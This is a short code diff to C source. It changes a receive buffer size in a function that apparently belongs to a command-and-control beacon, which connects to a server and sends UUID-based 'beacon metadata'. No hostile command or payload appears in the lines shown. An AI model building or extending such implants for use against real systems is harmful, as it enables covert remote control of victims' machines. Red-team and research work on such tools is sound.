@@ -39,7 +39,7 @@ void beacon_connect_to_server(char IP[16], int PORT){
 
     // Generate and send beacon metadata     
     //// Generate UUID
-    int recvbuflen = 2048;
+    int recvbuflen = 4098;
     UUID uuid;
     UuidCreate(&uuid);
     char stringified_UUID[128];
